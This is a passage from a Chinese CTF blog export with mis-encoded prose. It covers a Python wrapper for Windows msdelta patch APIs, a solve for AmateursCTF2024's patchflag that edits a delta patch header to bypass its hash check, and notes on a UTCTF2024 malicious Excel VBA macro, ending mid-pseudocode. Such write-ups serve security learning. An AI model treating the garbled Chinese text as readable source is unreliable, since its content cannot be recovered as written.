<span class="title function_">LoadLibrary</span>(<span class="params">dll</span>):</span><br><span class="line">    _LoadLibraryA = ctypes.windll.kernel32.LoadLibraryA</span><br><span class="line">    _LoadLibraryA.argtypes = [LPSTR]</span><br><span class="line">    _LoadLibraryA.restype = HMODULE</span><br><span class="line">    _LoadLibraryA.errcheck = RaiseIfZero</span><br><span class="line">    <span class="keyword">return</span> _LoadLibraryA(dll)</span><br><span class="line"></span><br><span class="line">DELTA_FLAG_TYPE = ctypes.c_ulonglong</span><br><span class="line">DELTA_FILE_TYPE = ctypes.c_ulonglong</span><br><span class="line">DELTA_FLAG_NONE = <span class="number">0</span></span><br><span class="line">DELTA_APPLY_FLAG_ALLOW_PA19 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">DELTA_MAX_HASH_SIZE = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DELTA_HASH</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;HashSize&quot;</span>, DWORD),</span><br><span class="line">        (<span class="string">&quot;HashValue&quot;</span>, BYTE * DELTA_MAX_HASH_SIZE)</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DELTA_HEADER_INFO</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;FileTypeSet&quot;</span>, DELTA_FILE_TYPE),</span><br><span class="line">        (<span class="string">&quot;FileType&quot;</span>, DELTA_FILE_TYPE),</span><br><span class="line">        (<span class="string">&quot;Flags&quot;</span>, DELTA_FILE_TYPE),</span><br><span class="line">        (<span class="string">&quot;TargetSize&quot;</span>, SIZE_T),</span><br><span class="line">        (<span class="string">&quot;TargetFileTime&quot;</span>, FILETIME),</span><br><span class="line">        (<span class="string">&quot;TargetHashAlgId&quot;</span>, ALG_ID),</span><br><span class="line">        (<span class="string">&quot;TargetHash&quot;</span>, DELTA_HASH),</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join([</span><br><span class="line">            <span class="string">&quot;[+] FileTypeSet     : 0x&#123;0:X&#125;&quot;</span>.<span class="built_in">format</span>(self.FileTypeSet),</span><br><span class="line">            <span class="string">&quot;[+] FileType        : 0x&#123;0:X&#125;&quot;</span>.<span class="built_in">format</span>(self.FileType),</span><br><span class="line">            <span class="string">&quot;[+] Flags           : 0x&#123;0:X&#125;&quot;</span>.<span class="built_in">format</span>(self.Flags),</span><br><span class="line">            <span class="string">&quot;[+] TargetSize      : 0x&#123;0:X&#125;&quot;</span>.<span class="built_in">format</span>(self.TargetSize),</span><br><span class="line">            <span class="string">&quot;[+] TargetFileTime  : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(self.TargetFileTime)),</span><br><span class="line">            <span class="string">&quot;[+] TargetHashAlgId : 0x&#123;0:X&#125;&quot;</span>.<span class="built_in">format</span>(self.TargetHashAlgId),</span><br><span class="line">            <span class="string">&quot;[+] TargetHash      : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;&quot;</span>.join(<span class="string">&quot;&#123;0:02X&#125;&quot;</span>.<span class="built_in">format</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> self.TargetHash.HashValue[:self.TargetHash.HashSize])),</span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DELTA_INPUT</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;lpStart&quot;</span>, LPBUFFER),</span><br><span class="line">        (<span class="string">&quot;uSize&quot;</span>, ULONG),</span><br><span class="line">        (<span class="string">&quot;Editable&quot;</span>, BOOL)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DELTA_OUTPUT</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;lpStart&quot;</span>, LPBUFFER),</span><br><span class="line">        (<span class="string">&quot;uSize&quot;</span>, ULONG)]</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#BOOL  WINAPI  ApplyDeltaB(</span></span><br><span class="line"><span class="comment">#    DELTA_FLAG_TYPE  ApplyFlags,</span></span><br><span class="line"><span class="comment">#    DELTA_INPUT      Source,</span></span><br><span class="line"><span class="comment">#    c      Delta,</span></span><br><span class="line"><span class="comment">#    LPDELTA_OUTPUT   lpTarget</span></span><br><span class="line"><span class="comment">#   );</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ApplyDeltaB</span>(<span class="params">source, delta, flags=DELTA_APPLY_FLAG_ALLOW_PA19</span>):</span><br><span class="line">    _ApplyDeltaB = ctypes.windll.msdelta.ApplyDeltaB</span><br><span class="line">    _ApplyDeltaB.argtypes = [DELTA_FLAG_TYPE, DELTA_INPUT, DELTA_INPUT, ctypes.POINTER(DELTA_OUTPUT)]</span><br><span class="line">    _ApplyDeltaB.restype = BOOL</span><br><span class="line">    _ApplyDeltaB.errcheck = RaiseIfZero</span><br><span class="line">    dsource = DELTA_INPUT()</span><br><span class="line">    dsource.lpStart = ctypes.create_string_buffer(source)</span><br><span class="line">    dsource.uSize = <span class="built_in">len</span>(source)</span><br><span class="line">    dsource.Editable = <span class="literal">False</span></span><br><span class="line">    ddelta = DELTA_INPUT()</span><br><span class="line">    ddelta.lpStart = ctypes.create_string_buffer(delta)</span><br><span class="line">    ddelta.uSize = <span class="built_in">len</span>(delta)</span><br><span class="line">    ddelta.Editable = <span class="literal">False</span></span><br><span class="line">    out = DELTA_OUTPUT()</span><br><span class="line">    _ApplyDeltaB(flags, dsource, ddelta, ctypes.byref(out))</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#BOOL  WINAPI  GetDeltaInfoA(</span></span><br><span class="line"><span class="comment">#    LPCSTR               lpDeltaName,</span></span><br><span class="line"><span class="comment">#    LPDELTA_HEADER_INFO  lpHeaderInfo</span></span><br><span class="line"><span class="comment">#    );</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Note: This doesn&#x27;t work with file distributed inside KB as there is a</span></span><br><span class="line"><span class="comment"># checksum at the start of the file</span></span><br><span class="line"><span class="comment"># msdelta!compo::CheckBuffersIdentityFactory::CheckBuffersIdentityComponent::InternalProcess+0x84:</span></span><br><span class="line"><span class="comment"># 00007ffe`8d4d6894 e8aa5b0300      call    msdelta!memcmp (00007ffe`8d50c443)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetDeltaInfo</span>(<span class="params">delta</span>):</span><br><span class="line">    _GetDeltaInfoA = ctypes.windll.msdelta.GetDeltaInfoA</span><br><span class="line">    _GetDeltaInfoA.argtypes = [LPCSTR, ctypes.POINTER(DELTA_HEADER_INFO)]</span><br><span class="line">    _GetDeltaInfoA.restype = BOOL</span><br><span class="line">    _GetDeltaInfoA.errcheck = RaiseIfZero</span><br><span class="line">    info = DELTA_HEADER_INFO()</span><br><span class="line">    _GetDeltaInfoA(delta, ctypes.byref(info))</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># BOOL  WINAPI  GetDeltaInfoB(</span></span><br><span class="line"><span class="comment">#     DELTA_INPUT          Delta,</span></span><br><span class="line"><span class="comment">#     LPDELTA_HEADER_INFO  lpHeaderInfo</span></span><br><span class="line"><span class="comment">#     );</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetDeltaInfoB</span>(<span class="params">source</span>):</span><br><span class="line">    _GetDeltaInfoB = ctypes.windll.msdelta.GetDeltaInfoB</span><br><span class="line">    _GetDeltaInfoB.argtypes = [DELTA_INPUT, ctypes.POINTER(DELTA_HEADER_INFO)]</span><br><span class="line">    _GetDeltaInfoB.restype = BOOL</span><br><span class="line">    _GetDeltaInfoB.errcheck = RaiseIfZero</span><br><span class="line">    <span class="built_in">input</span> = DELTA_INPUT()</span><br><span class="line">    <span class="built_in">input</span>.lpStart = ctypes.create_string_buffer(source)</span><br><span class="line">    <span class="built_in">input</span>.uSize = <span class="built_in">len</span>(source)</span><br><span class="line">    <span class="built_in">input</span>.Editable = <span class="literal">False</span></span><br><span class="line">    info = DELTA_HEADER_INFO()</span><br><span class="line">    _GetDeltaInfoB(<span class="built_in">input</span>, ctypes.byref(info))</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_delta_info</span>(<span class="params">source</span>):</span><br><span class="line">    buf = <span class="built_in">open</span>(source, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    buf = buf[<span class="number">4</span>:] <span class="comment"># remove CRC</span></span><br><span class="line">    x = GetDeltaInfoB(buf)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">apply_delta</span>(<span class="params">source, delta, outfile</span>):</span><br><span class="line">    bufs = <span class="built_in">open</span>(source, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    bufd = <span class="built_in">open</span>(delta, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    bufd = bufd[<span class="number">4</span>:] <span class="comment"># remove CRC</span></span><br><span class="line">    out = ApplyDeltaB(bufs, bufd)</span><br><span class="line">    <span class="built_in">open</span>(outfile, <span class="string">&quot;wb&quot;</span>).write(out.lpStart[:out.uSize])</span><br><span class="line"></span><br><span class="line">LoadLibrary(<span class="string">b&quot;msdelta.dll&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;MSdelta patch applier&quot;</span>)</span><br><span class="line">    ACTIONS = [<span class="string">&quot;info&quot;</span>, <span class="string">&quot;apply&quot;</span>]</span><br><span class="line">    actions = parser.add_subparsers(<span class="built_in">help</span>=<span class="string">&quot;Action to perform: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;,&quot;</span>.join(ACTIONS)), dest=<span class="string">&quot;action&quot;</span>)</span><br><span class="line">    info = actions.add_parser(<span class="string">&quot;info&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Print delta patch information&quot;</span>)</span><br><span class="line">    info.add_argument(<span class="string">&quot;delta_file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;delta patch file&quot;</span>)</span><br><span class="line">    apply = actions.add_parser(<span class="string">&quot;apply&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Apply delta patch&quot;</span>)</span><br><span class="line">    apply.add_argument(<span class="string">&quot;delta_file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;delta patch file&quot;</span>)</span><br><span class="line">    apply.add_argument(<span class="string">&quot;input_file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input file&quot;</span>)</span><br><span class="line">    apply.add_argument(<span class="string">&quot;output_file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;output file&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.action == <span class="string">&quot;info&quot;</span>:</span><br><span class="line">        info = get_delta_info(args.delta_file)</span><br><span class="line">        <span class="built_in">print</span>(info)</span><br><span class="line">    <span class="keyword">elif</span> args.action == <span class="string">&quot;apply&quot;</span>:</span><br><span class="line">        apply_delta(args.input_file, args.delta_file, args.output_file)</span><br></pre></td></tr></table></figure>

<h2 id="æ‰“è¡¥ä¸"><a href="#æ‰“è¡¥ä¸" class="headerlink" title="æ‰“è¡¥ä¸"></a>æ‰“è¡¥ä¸</h2><p>ç”±äºå®˜æ–¹æ²¡æœ‰ç»™å‡ºpatchè¿‡ç¨‹çš„æŠ€æœ¯ç»†èŠ‚ æˆ‘ä¹Ÿæ²¡é€†æ¸…æ¥š( æ‰€ä»¥å°±å½’çº³ä¸€ä¸‹å¤šæ¬¡å°è¯•å¾—å‡ºçš„æœ‰å…³patchè¿‡ç¨‹çš„ç»“è®º:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¡¥ä¸ä½œç”¨äºæºæ–‡ä»¶å¾—åˆ°çš„ç›®æ ‡æ–‡ä»¶æ˜¯å›ºå®šä¸å˜çš„</span><br><span class="line">1.è‹¥æºæ–‡ä»¶å’Œç›®æ ‡æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªä¸ºç©ºåˆ™è¿™ä¸ªè¡¥ä¸å¯ä»¥ä½œç”¨äºä»»ä½•ä¸€ä¸ªå¦å¤–æä¾›çš„æºæ–‡ä»¶</span><br><span class="line">2.è‹¥æºæ–‡ä»¶å’Œç›®æ ‡æ–‡ä»¶å‡ä¸ä¸ºç©ºæ—¶ è¡¥ä¸å¿…é¡»ä½œç”¨äºé™¤äº†æœ‰å·®å¼‚çš„ä½ç½®ä»¥å¤–å’Œç›®æ ‡æ–‡ä»¶å®Œå…¨ä¸€è‡´çš„æºæ–‡ä»¶ </span><br><span class="line">    e.g.</span><br><span class="line">    delta &lt;= from b&#x27;unpatch&#x27; to b&#x27;__patched&#x27;</span><br><span class="line">    delta can be applied to any Source b&#x27;??patch??&#x27;(? for any)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¸æ»¡è¶³è¿™äº›æ¡ä»¶ æ ¹æ®è°ƒç”¨è§„å®šApplyDelta APIåœ¨è¿”å›ååœ¨RAXä¸­å­˜æ”¾é”™è¯¯ç  æ¯”è¾ƒå¸¸è§çš„æ˜¯<code>0xD:æ— æ•ˆè¡¥ä¸</code> è‡³äºæ— æ•ˆè¡¥ä¸çš„æˆå›  å…ˆè¯´æ˜è¡¥ä¸åŒ…å«çš„å†…å®¹ä¸­å“ªäº›å¯¹æ‰“è¡¥ä¸çš„ç»“æœæœ‰ä½œç”¨</p>
<p>ä»¥AmateursCTF2024çš„ä¸€é“é¢˜ä¸ºä¾‹:</p>
<h3 id="AmateursCTF2024-rev-patchflag"><a href="#AmateursCTF2024-rev-patchflag" class="headerlink" title="AmateursCTF2024&#x2F;rev&#x2F;patchflag"></a>AmateursCTF2024&#x2F;rev&#x2F;patchflag</h3><p>é¢˜ç›®çš„è¦æ±‚å°±æ˜¯æˆåŠŸåˆ©ç”¨ç»™å‡ºçš„è¡¥ä¸ dumpå‡ºè¿™ä¸ªè¡¥ä¸:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/04/28/20240428-232710.png" alt="image-20240428232703227"></p>
<p>æ­£å¸¸çš„è¡¥ä¸å¼€å¤´çš„4bytesæ˜¯è¡¥ä¸çš„CRC32 é¢˜ç›®ç»™å‡ºçš„è¡¥ä¸æŠ¹å»äº†è¿™ä¸ªä¿¡æ¯ <code>PA30</code>æ˜¯ç”Ÿæˆè¡¥ä¸çš„æ ‡å‡† ä½†æ˜¯è¿™ä¸¤ä¸ªå†…å®¹ä¸å½±å“è¡¥ä¸ç»“æœ è¿™é‡Œç›´æ¥æ’å…¥4bytesçš„0å¾—åˆ°è¡¥ä¸çš„ä¿¡æ¯:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/04/28/20240428-233021.png" alt="image-20240428233021811"></p>
<p>è¿˜æœ‰ä¸¤ä¸ªä¸å½±å“æ‰“è¡¥ä¸çš„å†…å®¹(å°ç«¯åº) åˆ†åˆ«æ ‡å¿—äº†ä¸¤ä¸ªæ—¶é—´:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/04/28/20240428-233218.png" alt="image-20240428233218208"></p>
<p>åç»­çš„ä¸€ä¸ªå­—<code>0x23 18</code>ç”¨å¤„æš‚ä¸æ˜ç¡® å†åç»­ä¸€ä¸ªå­—<code>0x8 36 8</code> [:4]ä¸æ ¡éªŒç»“æœä½¿ç”¨çš„hashç®—æ³•æœ‰å…³ ä¸‹æ–‡ä¼šç»™å‡ºè¯´æ˜ [4:24]æ˜¯ç›®æ ‡æ–‡ä»¶çš„å­—èŠ‚é•¿åº¦ [24:]ä¸ç¡®å®šè¯¦ç»†å«ä¹‰ ä½†æ˜¯ä¸ç”Ÿæˆè¡¥ä¸æ—¶çš„é€‰é¡¹æ ‡å¿—ä½æœ‰å…³</p>
<p>æ¥ä¸‹æ¥çš„ä¸€ä¸ªå­—<code>0x8004</code>ä¸ºæ ¡éªŒä½¿ç”¨çš„<a href="https://learn.microsoft.com/en-us/windows/win32/seccrypto/alg-id">hashç®—æ³•ID</a> æ ¹æ®å®éªŒå…¶åªæ”¯æŒmdç³»åˆ—ç®—æ³•ä»¥åŠæ–‡æ¡£ä¸­ç»™å‡ºçš„ä¸¤ç§ç‰¹æ®Šæ ‡å¿—:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/04/28/20240428-234442.png" alt="image-20240428234442506"></p>
<p>æ‰€ä½¿ç”¨çš„hashæ ¡éªŒç®—æ³•ä¼šå½±å“ä¸Šé¢è¯´çš„4ä½æ ‡å¿—ä½ å·²ç»è¯•å‡ºæ¥çš„æœ‰:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.å½“ä½¿ç”¨mdç³»åˆ—hashæ—¶     flag = 0b1000</span><br><span class="line">2.ä½¿ç”¨CRC32æ—¶          flag = 0b0010</span><br><span class="line">3.ä¸è¿›è¡Œhashæ ¡éªŒæ—¶    flag = 0b0001</span><br></pre></td></tr></table></figure>

<p>å†æ¥ä¸‹æ¥çš„ä¸€ä¸ªå­—çŒœæµ‹ä¸hashçš„ç»“æœé•¿åº¦æœ‰å…³ è¿™äº›å­—èŠ‚éƒ½ä¼šå½±å“æ‰“è¡¥ä¸çš„å¤±è´¥ä¸å¦ æ¥ä¸‹æ¥çš„<code>hash_size</code>ä¸ªå­—èŠ‚ä¸ºé¢„æœŸç›®æ ‡æ–‡ä»¶çš„hashæ ¡éªŒç  è¿›è¡Œè¡¥ä¸åéœ€è¦è®¡ç®—ç»“æœhashä¸è¿™ä¸ªhashè¿›è¡Œå¯¹æ¯” å¦‚æœæ ¡éªŒå¤±è´¥åˆ™è¿”å›0xDé”™è¯¯ç  åç»­çš„å­—èŠ‚å°±æ˜¯ç»è¿‡å‹ç¼©çš„å·®å¼‚ä¿¡æ¯</p>
<p>å¯¹äºè¿™ä¸€é¢˜ hashæ ¡éªŒå€¼æ˜æ˜¾å·²ç»è¢«é­”æ”¹ å¯ä»¥å†æ¬¡é­”æ”¹è¡¥ä¸è®©å…¶ä¸è¿›è¡Œhashæ ¡éªŒ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> test <span class="keyword">import</span> get_patch_info</span><br><span class="line"><span class="keyword">from</span> delta_patch <span class="keyword">import</span> apply_patch_to_buffer</span><br><span class="line"></span><br><span class="line">patch = <span class="built_in">bytes</span>([<span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0xC0</span>, <span class="number">0x08</span>, <span class="number">0x97</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, <span class="number">0x3C</span>, </span><br><span class="line">  <span class="number">0xDA</span>, <span class="number">0x01</span>, <span class="number">0x18</span>, <span class="number">0x23</span>, <span class="number">0x68</span>, <span class="number">0x83</span>, <span class="number">0x04</span>, <span class="number">0x80</span>, <span class="number">0x52</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x79</span>, <span class="number">0x2D</span>, <span class="number">0x6B</span>, <span class="number">0x69</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, </span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x00</span>, <span class="number">0xB7</span>, <span class="number">0x03</span>, <span class="number">0x88</span>, <span class="number">0x69</span>, <span class="number">0xB3</span>, <span class="number">0xFA</span>, <span class="number">0xF4</span>, </span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0xDD</span>, <span class="number">0x8C</span>, <span class="number">0x01</span>, <span class="number">0xD1</span>, <span class="number">0xDA</span>, <span class="number">0x4D</span>, <span class="number">0x88</span>, </span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0x4C</span>, <span class="number">0xBB</span>, <span class="number">0x71</span>, <span class="number">0x7D</span>, <span class="number">0xDA</span>, <span class="number">0x75</span>, <span class="number">0x6A</span>, <span class="number">0x37</span>, </span><br><span class="line">  <span class="number">0x2A</span>, <span class="number">0xD2</span>, <span class="number">0x88</span>, <span class="number">0x11</span>, <span class="number">0x91</span>, <span class="number">0x22</span>, <span class="number">0x4E</span>, <span class="number">0x66</span>, <span class="number">0xDE</span>, <span class="number">0xA0</span>, </span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0x3D</span>, <span class="number">0x22</span>, <span class="number">0xCC</span>, <span class="number">0x9B</span>, <span class="number">0xD6</span>, <span class="number">0xAE</span>, <span class="number">0x47</span>, <span class="number">0xB4</span>, <span class="number">0x39</span>, </span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0x56</span>, <span class="number">0x01</span>])</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;amateursCTF&#123;&quot;</span> + <span class="string">b&quot;_&quot;</span> * <span class="number">41</span> + <span class="string">b&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    out = apply_patch_to_buffer(patch, buf)</span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">info = get_patch_info(patch)</span><br><span class="line">hexinfo = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> info:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        hexinfo.append(<span class="built_in">hex</span>(x))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        hexinfo.append(x)</span><br><span class="line"></span><br><span class="line">newheader = patch[:<span class="number">14</span>] + <span class="string">b&#x27;h\x13\x02&#x27;</span> + patch[<span class="number">16</span> + <span class="number">4</span> + <span class="number">0x14</span>:]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    out = apply_patch_to_buffer(buf, newheader)</span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="comment"># Patch file is invalid</span></span><br><span class="line"><span class="comment"># b&#x27;amateursCTF&#123;suff3r_th3_p41n_of_a_m1ll10n_wind0ws_d3v5&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>å¦å¤–ä¸€ä¸ªæ–¹æ³•å°±æ˜¯åœ¨è·å–ç›®æ ‡hashå€¼(<code>compo::PullcapiContext::GetHash</code>)å‰è·å–åˆ°ç›®æ ‡å­—èŠ‚æµ</p>
]]></content>
      <categories>
        <category>Windowså†…æ ¸</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>UTCTF2024é€†å‘æ–¹å‘éƒ¨åˆ†wp</title>
    <url>/2024/04/04/UTCTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<p>å‚èµ›ID:1K0CT, æ— é˜Ÿä¼</p>
<p>è§£å‡º:Fruit Deals, PES-128</p>
<span id="more"></span>

<h2 id="Fruit-Deals-vbaç—…æ¯’"><a href="#Fruit-Deals-vbaç—…æ¯’" class="headerlink" title="Fruit Deals | vbaç—…æ¯’"></a>Fruit Deals | vbaç—…æ¯’</h2><p>é™„ä»¶æ˜¯ä¸€ä¸ªEXCELè¡¨æ ¼ xmlå¯ä»¥æ‰§è¡Œvbaå® å¯ä»¥ä½¿ç”¨<code>oletools</code>ä¸­çš„<code>olevba.exe</code>å¯¼å‡ºvbaå®æˆ–ç›´æ¥æ‰“å¼€EXCELæŸ¥çœ‹:</p>
<p>â‘ <code>olevba.exe -c input &gt; output</code></p>
<p>â‘¡<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/04/04/20240404-095805.png" alt="image-20240404095758389" style="zoom:50%;" /></p>
<p>å¾—åˆ°æœ¬é¢˜çš„ä¸¤ä¸ªæ¨¡å— åˆ†åˆ«æ˜¯ç”¨éšæœºæ•°çš„base64ç¼–ç å¡«å……ä¸€ä¸ªé¡µ, æŒ‰ç…§è¿™ä¸ªé¡µä¸­çš„æ•°æ®æ¥æ‹¼æ¥ä¸€æ¡cmd Shellcode æŒ‰ç…§é¢˜ç›®æè¿° è¦é€šè¿‡Shellcodeä»æœåŠ¡å™¨ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ è·å–è¿™ä¸ªæ–‡ä»¶åå³æ˜¯flag</p>
<p>base64å¡«å……çš„é¡µæ˜¯<code>Sheet2</code> å¾ˆæ˜æ˜¾è¢«éšè—åŒæ ·åœ¨æ˜¾ç¤ºä»£ç ç•Œé¢å°†å…¶å±æ€§æ”¹ä¸ºå¯è§ç„¶åæ‰‹åŠ¨æ‹¼æ¥Shellcodeå¾—åˆ°flag:<code>utflag&#123;banANA-Hakrz09182afd4.exe&#125;</code></p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/04/04/20240404-100416.png" alt="image-20240404100416705" style="zoom:67%;" />

<h2 id="PES-128-å¹¶è¡Œå¼åŠ å¯†"><a href="#PES-128-å¹¶è¡Œå¼åŠ å¯†" class="headerlink" title="PES-128 | å¹¶è¡Œå¼åŠ å¯†"></a>PES-128 | å¹¶è¡Œå¼åŠ å¯†</h2><p>æ€»ä½“æ¥è¯´é¢˜ç›®çš„åŠ å¯†é€»è¾‘ä¸éš¾ ä½†æ˜¯å¤šçº¿ç¨‹å¹¶è¡Œçš„åŠ å¯†æ–¹å¼å¼¥è¡¥äº†è¿™ä¸€ç‚¹ å…·ä½“çœ‹IDAä¼ªä»£ç :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">main:</span><br><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *index; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  __int64 v14; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v15; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">void</span> *end; <span class="comment">// rbp</span></span><br><span class="line">  _QWORD *v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rdi</span></span><br><span class="line">  <span class="built_in">std</span>::thread *v19; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> id; <span class="comment">// bl</span></span><br><span class="line">  <span class="built_in">std</span>::thread *v21; <span class="comment">// r13</span></span><br><span class="line">  __int64 arg; <span class="comment">// rax</span></span><br><span class="line">  __m128i v23; <span class="comment">// xmm0</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v24; <span class="comment">// r12</span></span><br><span class="line">  <span class="built_in">std</span>::thread *v25; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v26; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *reslut; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v28; <span class="comment">// r14</span></span><br><span class="line">  __int64 v29; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> *v30; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">bool</span> v31; <span class="comment">// zf</span></span><br><span class="line">  _BYTE 